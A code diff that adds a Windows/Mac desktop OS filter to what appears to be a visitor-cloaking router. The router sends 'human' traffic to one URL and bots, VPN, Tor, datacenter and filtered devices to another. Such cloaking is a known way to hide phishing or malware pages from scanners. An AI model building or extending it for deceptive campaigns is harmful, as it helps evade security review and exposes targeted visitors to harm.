@@ -1864,6 +1864,7 @@ Disallow: /*`);
         botUrl, 
         allowedCountries, 
         allowedDevices,
+        desktopOsFilter,
         blockVpn,
         blockDatacenter,
         blockTor,
@@ -1967,17 +1968,21 @@ Disallow: /*`);
       const validDevices = ["all", "desktop", "mobile", "mobile_tablet"];
       const formattedAllowedDevices = validDevices.includes(allowedDevices) ? allowedDevices : "all";
 
+      const validOs = ["both", "windows", "mac"];
+      const formattedDesktopOsFilter = validOs.includes(desktopOsFilter) ? desktopOsFilter : "both";
+
       const effectiveBlockVpn = blockVpn === "allow" ? "allow" : (blockVpn === "block" ? "block" : (allowVpn ? "allow" : "block"));
       const effectiveAllowVpn = effectiveBlockVpn === "allow";
 
       // Log URL update for compliance audit trail
-      console.log(`[COMPLIANCE] User ${userId} updated routing rules: human=${parsedHuman.hostname} bot=${normalizedBotUrl} allowedCountries=${formattedAllowedCountries} allowedDevices=${formattedAllowedDevices} blockVpn=${effectiveBlockVpn}`);
+      console.log(`[COMPLIANCE] User ${userId} updated routing rules: human=${parsedHuman.hostname} bot=${normalizedBotUrl} allowedCountries=${formattedAllowedCountries} allowedDevices=${formattedAllowedDevices} desktopOs=${formattedDesktopOsFilter} blockVpn=${effectiveBlockVpn}`);
 
       const updated = await storage.setUserRedirectUrls(userId, { 
         humanUrl, 
         botUrl: normalizedBotUrl,
         allowedCountries: formattedAllowedCountries,
         allowedDevices: formattedAllowedDevices,
+        desktopOsFilter: formattedDesktopOsFilter,
         blockVpn: effectiveBlockVpn,
         blockDatacenter: blockDatacenter || "block",
         blockTor: blockTor || "block",
@@ -3450,6 +3455,7 @@ Disallow: /*`);
       let configuredBotUrl: string | null = null;
       let ownerAllowedCountries: string[] = [];
       let ownerAllowedDevices: string = "all";
+      let ownerDesktopOsFilter: string = "both";
       let ownerBlockVpn: string = "block";
       let ownerBlockDatacenter: string = "block";
       let ownerBlockTor: string = "block";
@@ -3477,6 +3483,7 @@ Disallow: /*`);
               }
 
               ownerAllowedDevices = redirectUrls.allowedDevices || "all";
+              ownerDesktopOsFilter = redirectUrls.desktopOsFilter || "both";
               ownerBlockVpn = redirectUrls.blockVpn || (redirectUrls.allowVpn ? "allow" : "block");
               ownerBlockDatacenter = redirectUrls.blockDatacenter || "block";
               ownerBlockTor = redirectUrls.blockTor || "block";
@@ -3623,14 +3630,30 @@ Disallow: /*`);
           }
         }
 
-        // TIER 5A: DEVICE TYPE FILTERING (Desktop vs Mobile vs Mobile & Tablet)
+        // TIER 5A: DEVICE & OS FILTERING (Desktop vs Mobile vs Mobile & Tablet + Windows/Mac)
         if (visitorType !== 'Bot' && ownerAllowedDevices && ownerAllowedDevices !== 'all') {
           const lowerDevice = (deviceType || '').toLowerCase();
-          if (ownerAllowedDevices === 'desktop' && lowerDevice !== 'desktop') {
-            visitorType = 'Bot';
-            detectionMethod = 'Device Restricted (Desktop Only)';
-            blockReason = `Device ${deviceType || 'non-desktop'} blocked by desktop-only policy`;
-            console.log(`🚫 BLOCKED (Tier 5A - Device Filter): ${clientIp} is ${deviceType}, policy is desktop only`);
+          if (ownerAllowedDevices === 'desktop') {
+            if (lowerDevice !== 'desktop') {
+              visitorType = 'Bot';
+              detectionMethod = 'Device Restricted (Desktop Only)';
+              blockReason = `Device ${deviceType || 'non-desktop'} blocked by desktop-only policy`;
+              console.log(`🚫 BLOCKED (Tier 5A - Device Filter): ${clientIp} is ${deviceType}, policy is desktop only`);
+            } else if (ownerDesktopOsFilter && ownerDesktopOsFilter !== 'both') {
+              const isWindows = /windows nt|win32|win64/i.test(userAgent);
+              const isMac = /macintosh|mac os x/i.test(userAgent);
+              if (ownerDesktopOsFilter === 'windows' && !isWindows) {
+                visitorType = 'Bot';
+                detectionMethod = 'OS Restricted (Windows Desktop Only)';
+                blockReason = `Non-Windows OS blocked by Windows-only desktop policy`;
+                console.log(`🚫 BLOCKED (Tier 5A - OS Filter): ${clientIp} blocked, required Windows desktop`);
+              } else if (ownerDesktopOsFilter === 'mac' && !isMac) {
+                visitorType = 'Bot';
+                detectionMethod = 'OS Restricted (Mac Desktop Only)';
+                blockReason = `Non-Mac OS blocked by macOS-only desktop policy`;
+                console.log(`🚫 BLOCKED (Tier 5A - OS Filter): ${clientIp} blocked, required Mac desktop`);
+              }
+            }
           } else if (ownerAllowedDevices === 'mobile' && lowerDevice !== 'mobile') {
             visitorType = 'Bot';
             detectionMethod = 'Device Restricted (Mobile Only)';
